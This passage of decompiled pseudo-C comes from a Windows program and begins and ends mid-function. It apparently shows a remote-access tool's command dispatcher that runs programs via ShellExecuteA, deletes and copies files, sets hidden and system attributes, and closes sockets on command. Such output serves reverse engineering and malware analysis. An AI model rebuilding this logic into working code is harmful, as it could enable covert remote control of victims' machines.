puStack528 = 0x473b0a;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        puStack528 = &fcn.00472f6c::var_5e0h;\n        uStack532 = 0x473b23;\n        fcn.00405964();\n        uStack532 = 0x473b33;\n        fcn.00405894();\n        if (uVar10) {\n            uStack532 = 0x473b47;\n            fcn.004059a4();\n            uStack532 = 0x40;\n            uStack536 = 0x47bd44;\n            uStack540 = 0x473b56;\n            uStack540 = fcn.004058fc();\n            uStack544 = 0;\n            puStack548 = 0x473b5e;\n            sub.user32.dll_MessageBoxA_1();\n        }\n        puStack548 = &fcn.00472f6c::var_5e4h;\n        uStack552 = 0x473b77;\n        fcn.00405964();\n        uStack552 = 0x473b87;\n        fcn.00405894();\n        if (uVar10) {\n            uStack552 = 0x473b9b;\n            fcn.004059a4();\n            uStack552 = 5;\n            uStack556 = 0;\n            uStack560 = 0;\n            uStack564 = 0x473ba9;\n            uStack564 = fcn.004058fc();\n            uStack568 = 0x47bd5c;\n            uStack572 = 0;\n            puStack576 = 0x473bb6;\n            sub.shell32.dll_ShellExecuteA();\n        }\n        puStack576 = 0x473bc3;\n        fcn.00405894();\n        if (uVar10) {\n            puStack580 = 0x473c09;\n            piStack584 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffdb8;\n            puStack576 = &stack0xfffffffc;\n            fcn.00464014();\n            fcn.00405784();\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack584;\n        }\n        puStack576 = &fcn.00472f6c::var_5f0h;\n        puStack580 = 0x473c36;\n        fcn.00405964();\n        puStack580 = 0x473c46;\n        fcn.00405894();\n        if (uVar10) {\n            puStack580 = 0x473c5e;\n            fcn.004059a4();\n            puStack580 = &fcn.00472f6c::var_1ch;\n            piStack584 = 0x473c6f;\n            fcn.00405a48();\n            piStack584 = 0x473c7f;\n            fcn.00405964();\n            piStack584 = 0x473c8c;\n            fcn.00405a48();\n            piStack584 = 0x473c9b;\n            fcn.004059a4();\n            piStack584 = &fcn.00472f6c::var_20h;\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48();\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            sub.kernel32.dll_LocalAlloc_1();\n            fcn.00463db8();\n            fcn.004054c0();\n            fcn.004054c0();\n            fcn.004054c0();\n            fcn.004054c0();\n            fcn.004054c0();\n            sub.kernel32.dll_CreateThread();\n            sub.kernel32.dll_CloseHandle_1();\n            fcn.0040a54c();\n            uVar2 = fcn.00489034();\n            puStack644 = 0x473dc8;\n            fcn.0040b6c4(uVar2);\n            puStack644 = var_5fch;\n            uStack648 = 0x47bbe4;\n            uStack652 = 0xe1;\n            uStack651 = 0x3d;\n            uStack650 = 0x47;\n            fcn.0040a54c();\n            uStack652 = 0xf0;\n            uStack651 = 0x3d;\n            uStack650 = 0x47;\n            Var12 = fcn.00489034();\n            uVar10 = *0x10 == 0x294;\n            var_290h = Var12;\n            uStack656 = Var12 >> 0x20;\n            uStack652 = Var12 >> 0x40;\n            uStack651 = Var12 >> 0x48;\n            uStack664 = 0x473e02;\n            fcn.0040b6c4(var_290h);\n            uStack664 = var_604h;\n            puStack668 = 0x473e18;\n            fcn.00405800();\n            puStack668 = 0x473e23;\n            fcn.00472b58();\n        }\n        puStack668 = 0x473e30;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = 1;\n            puStack668 = 0x473e3f;\n            fcn.00489f50();\n            puStack668 = 0x473e55;\n            fcn.00405784();\n            puStack668 = 0x473e60;\n            fcn.00472b58();\n        }\n        puStack668 = 0x473e6d;\n        fcn.00405894();\n        if (uVar10) {\n            puStack668 = 0x473e7f;\n            fcn.00489f50();\n            puStack668 = 0x473e95;\n            fcn.00405784();\n            puStack668 = 0x473ea0;\n            fcn.00472b58();\n        }\n        puStack668 = 0x473ead;\n        fcn.00405894();\n        if (uVar10) {\n            uVar10 = true;\n            puStack672 = 0x473f6c;\n            var_2a0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_2a0h;\n            piStack680 = 0x473ed0;\n            puStack668 = &stack0xfffffffc;\n            fcn.00405894();\n            if (uVar10) {\n                piStack680 = 0x473ed9;\n                fcn.00488ba4();\n            }\n            piStack680 = 0x473ee8;\n            fcn.00405894();\n            if (uVar10) {\n                piStack680 = 0x473ef1;\n                fcn.00488cf8();\n            }\n            piStack680 = 0x473f00;\n            fcn.00405894();\n            if (uVar10) {\n                piStack680 = 0x473f09;\n                fcn.0048a324();\n            }\n            bVar11 = true;\n            piStack684 = 0x473f4e;\n            piStack688 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffd50;\n            var_2b0h = 0x473f26;\n            piStack680 = &stack0xfffffffc;\n            fcn.00405894();\n            if (bVar11) {\n                var_2b0h = 0xffffffff;\n                var_2b4h = 0xf170;\n                uStack700 = 0x112;\n                puStack704 = *(**0x49291c + 0x30);\n                puStack708 = 0x473f44;\n                sub.user32.dll_SendMessageA();\n            }\n            *in_FS_OFFSET = piStack688;\n            piStack680 = 0x473f5d;\n            sub.kernel32.dll_GetCurrentProcessId();\n            piStack680 = 0x473f62;\n            fcn.00463be0();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_2a0h;\n        }\n        puStack668 = 0x473f8d;\n        fcn.00405894();\n        if (uVar10) {\n            puStack672 = 0x473fb2;\n            var_2a0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_2a0h;\n            piStack680 = *0x4987e4;\n            piStack684 = 0x473fa8;\n            puStack668 = &stack0xfffffffc;\n            sub.wsock32.dll_closesocket();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack680;\n        }\n        puStack668 = 0x473fd3;\n        fcn.00405894();\n        if (uVar10) {\n            bVar11 = true;\n            puStack672 = 0x474071;\n            var_2a0h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_2a0h;\n            piStack680 = 0x473ff6;\n            puStack668 = &stack0xfffffffc;\n            fcn.00405894();\n            if (bVar11) {\n                piStack680 = 0x47beb8;\n                piStack684 = *0x498908;\n                piStack688 = 0x47bee0;\n                var_2b0h = 0x474052;\n                fcn.00405800();\n                var_2b0h = 0x47405d;\n                fcn.00463cc4();\n            }\n            else {\n                piStack680 = 0x47beb8;\n                piStack684 = 0x47400a;\n                fcn.0040f1a8();\n                piStack684 = var_620h;\n                piStack688 = 0x47bee0;\n                var_2b0h = 0x474025;\n                fcn.00405800();\n                var_2b0h = 0x474030;\n                fcn.00463cc4();\n            }\n            var_2b0h = 0x474062;\n            sub.kernel32.dll_GetCurrentProcessId();\n            var_2b0h = 0x474067;\n            fcn.00463be0();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack688;\n        }\n        puStack668 = &fcn.00472f6c::var_628h;\n        puStack672 = 0x47409e;\n        fcn.00405964();\n        puStack672 = 0x4740ae;\n        fcn.00405894();\n        if (uVar10) {\n            puStack672 = 0x4740c2;\n            fcn.004059a4();\n            var_2a0h = 0x4740e6;\n            piStack680 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffd58;\n            piStack684 = 0x4740dc;\n            puStack672 = &stack0xfffffffc;\n            fcn.004891f4();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack680;\n        }\n        puStack672 = &fcn.00472f6c::var_62ch;\n        var_2a0h = 0x474113;\n        fcn.00405964();\n        var_2a0h = 0x474123;\n        fcn.00405894();\n        if (uVar10) {\n            var_2a0h = 0x47413b;\n            fcn.004059a4();\n            var_2a0h = &fcn.00472f6c::var_1ch;\n            piStack680 = 0x47414c;\n            fcn.00405a48();\n            piStack680 = 0x47415c;\n            fcn.00405964();\n            piStack680 = 0x474169;\n            fcn.00405a48();\n            piStack680 = 0x474178;\n            fcn.004059a4();\n            piStack680 = 0x474183;\n            fcn.00405504();\n            piStack684 = 0x474221;\n            piStack688 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffd50;\n            var_2b0h = 0x47419f;\n            piStack680 = &stack0xfffffffc;\n            fcn.00409af4();\n            if (var_630h == 0) {\n                var_2b0h = 5;\n                var_2b4h = 0x4741f4;\n                fcn.0040a518();\n                var_2b4h = 0x4741ff;\n                var_2b4h = fcn.004058fc();\n                uStack700 = 0;\n                puStack704 = 0x47420a;\n                puStack704 = fcn.004058fc();\n                puStack708 = 0x47bd5c;\n                piStack712 = NULL;\n                var_2c8h = 0x474217;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            else {\n                var_2b0h = 5;\n                var_2b4h = 0x4741b8;\n                fcn.0040a518();\n                var_2b4h = 0x4741c3;\n                var_2b4h = fcn.004058fc();\n                uStack700 = 0x4741cc;\n                uStack700 = fcn.004058fc();\n                puStack704 = 0x4741d5;\n                puStack704 = fcn.004058fc();\n                puStack708 = 0x47bd5c;\n                piStack712 = NULL;\n                var_2c8h = 0x4741e2;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack712;\n        }\n        puStack704 = &fcn.00472f6c::var_63ch;\n        puStack708 = 0x47424e;\n        fcn.00405964();\n        puStack708 = 0x47425e;\n        fcn.00405894();\n        if (uVar10) {\n            puStack708 = 0x474276;\n            fcn.004059a4();\n            puStack708 = &fcn.00472f6c::var_1ch;\n            piStack712 = 0x474287;\n            fcn.00405a48();\n            piStack712 = 0x474297;\n            fcn.00405964();\n            piStack712 = 0x4742a4;\n            fcn.00405a48();\n            piStack712 = 0x4742b3;\n            fcn.004059a4();\n            piStack712 = 0x4742be;\n            fcn.00405504();\n            var_2c8h = 0x47435c;\n            piStack720 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffd30;\n            var_2d0h = 0x4742da;\n            piStack712 = &stack0xfffffffc;\n            fcn.00409af4();\n            if (var_640h == NULL) {\n                var_2d0h = 0;\n                uStack728 = 0x47432f;\n                fcn.0040a518();\n                uStack728 = 0x47433a;\n                uStack728 = fcn.004058fc();\n                uStack732 = 0;\n                puStack736 = 0x474345;\n                puStack736 = fcn.004058fc();\n                var_2e0h = 0x47bd5c;\n                piStack744 = NULL;\n                puStack748 = 0x474352;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            else {\n                var_2d0h = 0;\n                uStack728 = 0x4742f3;\n                fcn.0040a518();\n                uStack728 = 0x4742fe;\n                uStack728 = fcn.004058fc();\n                uStack732 = 0x474307;\n                uStack732 = fcn.004058fc();\n                puStack736 = 0x474310;\n                puStack736 = fcn.004058fc();\n                var_2e0h = 0x47bd5c;\n                piStack744 = NULL;\n                puStack748 = 0x47431d;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack744;\n        }\n        puStack736 = &fcn.00472f6c::var_64ch;\n        var_2e0h = 0x474389;\n        fcn.00405964();\n        var_2e0h = 0x474399;\n        fcn.00405894();\n        if (uVar10) {\n            var_2e0h = 0x4743b1;\n            fcn.004059a4();\n            var_2e0h = &fcn.00472f6c::var_34h;\n            piStack744 = 0x4743c2;\n            fcn.00405a48();\n            piStack744 = 0x4743d2;\n            fcn.00405964();\n            piStack744 = 0x4743df;\n            fcn.00405a48();\n            piStack744 = 0x4743ee;\n            fcn.004059a4();\n            puStack748 = 0x474422;\n            piStack752 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffd10;\n            puStack756 = 0x474404;\n            piStack744 = &stack0xfffffffc;\n            fcn.00409e54();\n            puStack756 = 0x47440e;\n            fcn.00489290();\n            puStack756 = 0x474418;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack752;\n        }\n        piStack744 = &fcn.00472f6c::var_650h;\n        puStack748 = 0x47444f;\n        fcn.00405964();\n        puStack748 = 0x47445f;\n        fcn.00405894();\n        if (uVar10) {\n            puStack748 = 0x474477;\n            fcn.004059a4();\n            puStack748 = &fcn.00472f6c::var_38h;\n            piStack752 = 0x474488;\n            fcn.00405a48();\n            piStack752 = 0x474498;\n            fcn.00405964();\n            piStack752 = 0x4744a5;\n            fcn.00405a48();\n            piStack752 = 0x4744b4;\n            fcn.004059a4();\n            puStack756 = 0x474563;\n            var_2f4h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_2f4h;\n            var_2f8h = 0x4744ca;\n            piStack752 = &stack0xfffffffc;\n            iVar7 = fcn.00409e54();\n            if (iVar7 < 2) {\n                var_2f8h = 0x474553;\n                var_2f8h = fcn.004058fc();\n                var_2fch = 0x474559;\n                sub.kernel32.dll_DeleteFileA();\n            }\n            else {\n                var_2f8h = 0x4744d5;\n                iVar7 = fcn.00409e54();\n                if (-1 < iVar7) {\n                    iVar7 = iVar7 + 1;\n                    iVar9 = 0;\n                    do {\n                        var_2fch = 0x4744e6;\n                        iVar3 = fcn.00409e54();\n                        if (iVar9 == iVar3) {\n                            var_2fch = 0x4744f2;\n                            var_2f8h = fcn.004058fc();\n                            var_300h = 0x4744f8;\n                            sub.kernel32.dll_DeleteFileA();\n                        }\n                        else {\n                            var_2fch = &fcn.00472f6c::var_3ch;\n                            var_300h = 0x47450b;\n                            fcn.00405a48();\n                            var_300h = 0x47451b;\n                            fcn.00405964();\n                            var_300h = 0x474528;\n                            fcn.00405a48();\n                            var_300h = 0x474537;\n                            fcn.004059a4();\n                            var_300h = 0x47453f;\n                            var_2f8h = fcn.004058fc();\n                            var_304h = 0x474545;\n                            sub.kernel32.dll_DeleteFileA();\n                        }\n                        iVar9 = iVar9 + 1;\n                        iVar7 = iVar7 + -1;\n                    } while (iVar7 != 0);\n                }\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = var_2f8h;\n        }\n        puStack756 = &fcn.00472f6c::var_654h;\n        var_2f4h = 0x474590;\n        fcn.00405964();\n        var_2f4h = 0x4745a0;\n        fcn.00405894();\n        if (uVar10) {\n            var_2f4h = 0x4745b8;\n            fcn.004059a4();\n            var_2f4h = &fcn.00472f6c::var_38h;\n            var_2f8h = 0x4745c9;\n            fcn.00405a48();\n            var_2f8h = 0x4745d9;\n            fcn.00405964();\n            var_2f8h = 0x4745e6;\n            fcn.00405a48();\n            var_2f8h = 0x4745f5;\n            fcn.004059a4();\n            var_2fch = 0x474692;\n            var_300h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_300h;\n            var_304h = 0x47460b;\n            var_2f8h = &stack0xfffffffc;\n            iVar7 = fcn.00409e54();\n            if (iVar7 < 2) {\n                var_304h = 0x474688;\n                fcn.00489398();\n            }\n            else {\n                var_304h = 0x474616;\n                iVar7 = fcn.00409e54();\n                if (-1 < iVar7) {\n                    iVar7 = iVar7 + 1;\n                    iVar9 = 0;\n                    do {\n                        var_304h = 0x474627;\n                        iVar3 = fcn.00409e54();\n                        if (iVar9 == iVar3) {\n                            var_304h = 0x474633;\n                            fcn.00489398();\n                        }\n                        else {\n                            var_300h = &fcn.00472f6c::var_3ch;\n                            var_308h = 0x474646;\n                            fcn.00405a48();\n                            var_308h = 0x474656;\n                            fcn.00405964();\n                            var_308h = 0x474663;\n                            fcn.00405a48();\n                            var_308h = 0x474672;\n                            fcn.004059a4();\n                            var_308h = 0x47467a;\n                            fcn.00489398();\n                        }\n                        iVar9 = iVar9 + 1;\n                        iVar7 = iVar7 + -1;\n                    } while (iVar7 != 0);\n                }\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = var_300h;\n        }\n        var_2f8h = 0x4746b3;\n        fcn.00405894();\n        if (uVar10) {\n            var_2fch = 0x4746d2;\n            var_300h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_300h;\n            var_304h = 0x4746c8;\n            var_2f8h = &stack0xfffffffc;\n            fcn.0048943c();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_300h;\n        }\n        var_2f8h = &fcn.00472f6c::var_658h;\n        var_2fch = 0x4746ff;\n        fcn.00405964();\n        var_2fch = 0x47470f;\n        fcn.00405894();\n        if (uVar10) {\n            var_2fch = 0x474723;\n            fcn.004059a4();\n            var_300h = 0x47474e;\n            var_304h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_304h;\n            var_308h = 0x80;\n            var_30ch = 0x47473e;\n            var_2fch = &stack0xfffffffc;\n            var_30ch = fcn.004058fc();\n            var_310h = 0x474744;\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_30ch;\n        }\n        var_304h = &fcn.00472f6c::var_65ch;\n        var_308h = 0x47477b;\n        fcn.00405964();\n        var_308h = 0x47478b;\n        fcn.00405894();\n        if (uVar10) {\n            var_308h = 0x47479f;\n            fcn.004059a4();\n            var_30ch = 0x4747c7;\n            var_310h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_310h;\n            var_314h = 0x2;\n            piStack796 = 0x4747b7;\n            var_308h = &stack0xfffffffc;\n            piStack796 = fcn.004058fc();\n            piStack800 = 0x4747bd;\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack796;\n        }\n        var_310h = &fcn.00472f6c::var_660h;\n        var_314h = 0x4747f4;\n        fcn.00405964();\n        var_314h = 0x474804;\n        fcn.00405894();\n        if (uVar10) {\n            var_314h = 0x474818;\n            fcn.004059a4();\n            piStack796 = 0x474840;\n            piStack800 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffce0;\n            puStack804 = 0x1;\n            piStack808 = 0x474830;\n            var_314h = &stack0xfffffffc;\n            piStack808 = fcn.004058fc();\n            piStack812 = 0x474836;\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack808;\n        }\n        piStack800 = &fcn.00472f6c::var_664h;\n        puStack804 = 0x47486d;\n        fcn.00405964();\n        puStack804 = 0x47487d;\n        fcn.00405894();\n        if (uVar10) {\n            puStack804 = 0x474891;\n            fcn.004059a4();\n            piStack808 = 0x4748b9;\n            piStack812 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffcd4;\n            piStack816 = 0x4;\n            piStack820 = 0x4748a9;\n            puStack804 = &stack0xfffffffc;\n            piStack820 = fcn.004058fc();\n            var_334h = 0x4748af;\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack820;\n        }\n        piStack812 = &fcn.00472f6c::var_668h;\n        piStack816 = 0x4748e6;\n        fcn.00405964();\n        piStack816 = 0x4748f6;\n        fcn.00405894();\n        if (uVar10) {\n            piStack816 = 0x47490a;\n            fcn.004059a4();\n            piStack820 = 0x474932;\n            var_334h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_334h;\n            puStack828 = 0x20;\n            var_33ch = 0x474922;\n            piStack816 = &stack0xfffffffc;\n            var_33ch = fcn.004058fc();\n            var_340h = 0x474928;\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_33ch;\n        }\n        var_334h = &fcn.00472f6c::var_66ch;\n        puStack828 = 0x47495f;\n        fcn.00405964();\n        puStack828 = 0x47496f;\n        fcn.00405894();\n        if (uVar10) {\n            puStack828 = 0x474983;\n            fcn.004059a4();\n            var_33ch = 0x4749ae;\n            var_340h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::var_340h;\n            var_344h = 0x100;\n            var_348h = 0x47499e;\n            puStack828 = &stack0xfffffffc;\n            var_348h = fcn.004058fc();\n            wParam = 0x4749a4;\n            sub.kernel32.dll_SetFileAttributesA();\n            uVar10 = 1;\n            *in_FS_OFFSET = var_348h;\n        }\n        var_340h = &fcn.00472f6c::var_670h;\n        var_344h = 0x4749db;\n        fcn.00405964();\n        var_344h = 0x4749eb;\n        fcn.00405894();\n        if (uVar10) {\n            var_344h = 0x474a03;\n            fcn.004059a4();\n            var_348h = 0x474b21;\n            wParam = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00472f6c::wParam;\n            var_350h = 0x474a24;\n            var_344h = &stack0xfffffffc;\n            var_2c8h = fcn.0040a400();\n            if ((var_290h & 2) == 0) {\n                var_350h = 0x474a52;\n                fcn.00405504();\n            }\n            else {\n                var_350h = 0x474a43;\n                fcn.00405504();\n            }\n            if ((var_290h & 1) == 0) {\n                var_350h = 0x474a7a;\n                fcn.00405504();\n            }\n            else {\n                var_350h = 0x474a6b;\n                fcn.00405504();\n            }\n            if ((var_290h & 0x20) == 0) {\n                var_350h = 0x474aa2;\n                fcn.00405504();\n            }\n            else {\n                var_350h = 0x474a93;\n                fcn.00405504();\n            }\n            if ((var_290h & 4) == 0) {\n                var_350h = 0x474aca;\n                fcn.00405504();\n            }\n            else {\n                var_350h = 0x474abb;\n                fcn.00405504();\n            }\n            var_350h = 0x47c2e0;\n            piStack856 = var_4h;\n            uStack860 = 0x47c2f8;\n            uStack864 = 0x47c304;\n            uStack868 = var_5ch;\n            puStack872 = 0x47c320;\n            uStack876 = var_60h;\n            piStack880 = 0x47c320;\n            uStack884 = var_64h;\n            puStack888 = 0x47c320;\n            piStack892 = var_68h;\n            piStack896 = 0x47c32c;\n            piStack900 = 0x474b0c;\n            fcn.00405800();\n            piStack900 = 0x474b17;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack896;\n        }\n        puStack888 = &fcn.00472f6c::var_678h;\n        piStack892 = 0x474b4e;\n        fcn.00405964();\n        piStack892 = 0x474b5e;\n        fcn.00405894();\n        if (uVar10) {\n            piStack892 = 0x474b76;\n            fcn.004059a4();\n            piStack896 = 0x474f9b;\n            piStack900 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc7c;\n            piStack892 = &stack0xfffffffc;\n            if (*0x49890c != 0) {\n                puStack904 = &fcn.00472f6c::var_7ch;\n                puStack908 = 0x474ba5;\n                piStack892 = &stack0xfffffffc;\n                fcn.00405a48();\n                puStack908 = 0x474bb7;\n                fcn.00405964();\n                puStack908 = 0x474bc7;\n                fcn.00405a48();\n                puStack908 = 0x474bd8;\n                fcn.004059a4();\n                puStack908 = &fcn.00472f6c::var_67ch;\n                var_38ch = 0x474bef;\n                iVar7 = fcn.00405a48();\n                uVar10 = iVar7 == 1;\n                var_38ch = 0x474c01;\n                fcn.00405964();\n                var_38ch = 0x474c0c;\n                uVar4 = fcn.00409e54();\n                var_38ch = 0x474c1e;\n                fcn.00405a48();\n                var_38ch = 0x474c2f;\n                fcn.004059a4();\n                var_38ch = 0x474c3d;\n                fcn.00405504();\n                var_38ch = 0x474c4a;\n                fcn.00405894();\n                if (uVar10) {\n                    if (uVar4 < 2) {\n                        var_38ch = 0xffffffff;\n                        lpBuffer = 0x474dde;\n                        fcn.0040a604();\n                        lpBuffer = 0x474df2;\n                        fcn.00405784();\n                        lpBuffer = 0x474dfd;\n                        lpBuffer = fcn.004058fc();\n                        piStack920 = 0x474e06;\n                        piStack920 = fcn.004058fc();\n                        uStack924 = 0x474e0c;\n                        sub.kernel32.dll_CopyFileA();\n                        uStack924 = 0x474e14;\n                        uStack924 = fcn.004058fc();\n                        piStack928 = 0x474e1a;\n                        sub.kernel32.dll_DeleteFileA();\n                    }\n                    else if (uVar4 != 0) {\n                        var_2d0h = 1;\n                        uVar8 = uVar4;\n                        do {\n                            if (uVar4 == var_2d0h) {\n                                uStack924 = 0xffffffff;\n                                piStack928 = 0x474d80;\n                                fcn.0040a604();\n                                piStack928 = 0x474d94;\n                                fcn.00405784();\n                                piStack928 = 0x474d9f;\n                                piStack928 = fcn.004058fc();\n                                puStack932 = 0x474da8;\n                                puStack932 = fcn.004058fc();\n                                puStack936 = 0x474dae;\n                                sub.kernel32.dll_CopyFileA();\n                                puStack936 = 0x474db6;\n                                piStack920 = fcn.004058fc();\n                                piStack940 = 0x474dbc;\n                                sub.kernel32.dll_DeleteFileA();\n                            }\n                            else {\n                                uStack924 = 0xffffffff;\n                                piStack928 = &fcn.00472f6c::var_688h;\n                                puStack932 = 0x474c8f;\n                                fcn.00405a48();\n                                puStack932 = 0x474c9f;\n                                fcn.00405964();\n                                puStack932 = 0x474cb0;\n                                fcn.0040a604();\n                                puStack932 = 0x474cc4;\n                                fcn.00405784();\n                                puStack932 = 0x474ccf;\n                                puStack932 = fcn.004058fc();\n                                puStack936 = &fcn.00472f6c::var_68ch;\n                                piStack940 = 0x474ce4;\n                                fcn.00405a48();\n                                piStack940 = 0x474cf4;\n                                fcn.00405964();\n                                piStack940 = 0x474cff;\n                                piStack940 = fcn.004058fc();\n                                piStack944 = 0x474d05;\n                                sub.kernel32.dll_CopyFileA();\n                                piStack944 = &fcn.00472f6c::var_690h;\n                                piStack948 = 0x474d19;\n                                fcn.00405a48();\n                                piStack948 = 0x474d29;\n                                fcn.00405964();\n                                var_334h = var_690h;\n                                piStack948 = 0x474d40;\n                                piStack920 = fcn.004058fc();\n                                piStack952 = 0x474d46;\n                                iVar7 = sub.kernel32.dll_DeleteFileA();\n                                puStack828 = puStack828 & 0xffffff | 1 - (iVar7 == 0) << 0x18;\n                                piStack952 = 0x474d5f;\n                                fcn.00405a48();\n                                piStack952 = 0x474d6e;\n                                fcn.004059a4();\n                            }\n                            var_2d0h = var_2d0h + 1;\n                            uVar8 = uVar8 - 1;\n                        } while (uVar8 != 0);\n                    }\n                }\n                else if (uVar4 < 2) {\n                    var_38ch = 0xffffffff;\n                    lpBuffer = 0x474f4f;\n                    fcn.0040a604();\n                    lpBuffer = 0x474f63;\n                    fcn.00405784();\n                    lpBuffer = 0x474f6e;\n                    lpBuffer = fcn.004058fc();\n                    piStack920 = 0x474f77;\n                    piStack920 = fcn.004058fc();\n                    uStack924 = 0x474f7d;\n                    sub.kernel32.dll_CopyFileA();\n                }\n                else if (uVar4 != 0) {\n                    var_2d0h = 1;\n                    uVar8 = uVar4;\n                    do {\n                        if (uVar4 == var_2d0h) {\n                            uStack924 = 0xffffffff;\n                            piStack928 = 0x474f02;\n                            fcn.0040a604();\n                            piStack928 = 0x474f16;\n                            fcn.00405784();\n                            piStack928 = 0x474f21;\n                            piStack928 = fcn.004058fc();\n                            puStack932 = 0x474f2a;\n                            piStack920 = fcn.004058fc();\n                            puStack936 = 0x474f30;\n                            sub.kernel32.dll_CopyFileA();\n                        }\n                        else {\n                            uStack924 = 0xffffffff;\n                            piStack928 = &fcn.00472f6c::var_6ach;\n                            puStack932 = 0x474e5e;\n                            fcn.00405a48();\n                            puStack932 = 0x474e6e;\n                            fcn.00405964();\n                            puStack932 = 0x474e7f;\n                            fcn.0040a604();\n                            puStack932 = 0x474e93;\n                            fcn.00405784();\n                            puStack932 = 0x474e9e;\n                            puStack932 = fcn.004058fc();\n                            puStack936 = &fcn.00472f6c::var_6b0h;\n                            piStack940 = 0x474eb3;\n                            fcn.00405a48();\n                            piStack940 = 0x474ec3;\n                            fcn.00405964();\n                            piStack940 = 0x474ece;\n                            piStack920 = fcn.004058fc();\n                            piStack944 = 0x474ed4;\n                            sub.kernel32.dll_CopyFileA();\n                            piStack944 = 0x474ee1;\n                            fcn.00405a48();\n                            piStack944 = 0x474ef0;\n                            fcn.004059a4();\n                        }\n                        var_2d0h = var_2d0h + 1;\n                        uVar8 = uVar8 - 1;\n                    } while (uVar8 != 0);\n                }\n                uStack924 = 0x474f87;\n                fcn.0040546c();\n                uStack924 = 0x474f91;\n                fcn.00472b58();\n            }\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack920;\n        }\n        var_38ch = &fcn.00472f6c::var_6c4h;\n        lpBuffer = 0x474fc8;\n        fcn.00405964();\n        lpBuffer = 0x474fd8;\n        fcn.00405894();\n        if (uVar10) {\n            lpBuffer = 0x474fec;\n            fcn.004059a4();\n            lpBuffer = 0x474ff9;\n            fcn.004054c0();\n        }\n        lpBuffer = &fcn.00472f6c::var_6c8h;\n        piStack920 = 0x475012;\n        fcn.00405964();\n        piStack920 = 0x475022;\n        fcn.00405894();\n        if (uVar10) {\n            piStack920 = 0x47503a;\n            fcn.004059a4();\n            uStack924 = 0x4750fd;\n            piStack928 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc60;\n            puStack932 = NULL;\n            puStack936 = 0x47504f;\n            piStack920 = &stack0xfffffffc;\n            sub.ole32.dll_CoInitialize();\n            puStack936 = &fcn.00472f6c::var_84h;\n            piStack940 = 0x475063;\n            fcn.00405a48();\n            piStack940 = 0x475073;\n            fcn.00405964();\n            piStack940 = 0x475080;\n            fcn.00405a48();\n            piStack940 = 0x47508f;\n            fcn.004059a4();\n            piStack940 = &fcn.00472f6c::var_80h;\n            piStack944 = 0x4750a0;\n            fcn.00405a48();\n            piStack944 = 0x4750b0;\n            fcn.00405964();\n            piStack944 = 0x4750bd;\n            fcn.00405a48();\n            piStack944 = 0x4750cc;\n            fcn.004059a4();\n            piStack944 = 0x4750da;\n            fcn.00405504();\n            piStack944 = 0x4750ee;\n            fcn.00465158();\n            piStack944 = 0x4750f3;\n            sub.ole32.dll_CoUninitialize();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack940;\n        }\n        puStack932 = &fcn.00472f6c::var_6cch;\n        puStack936 = 0x47512a;\n        fcn.00405964();\n        puStack936 = 0x47513a;\n        fcn.00405894();\n        if (uVar10) {\n            puStack936 = 0x475152;\n            fcn.004059a4();\n            piStack940 = 0x4751dc;\n            piStack944 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffc50;\n            piStack948 = &fcn.00472f6c::var_40h;\n            piStack952 = 0x475171;\n            puStack936 = &stack0xfffffffc;\n            fcn.00405a48();\n            piStack952 = 0x475181;\n            fcn.00405964();\n            piStack952 = 0x47518e;\n     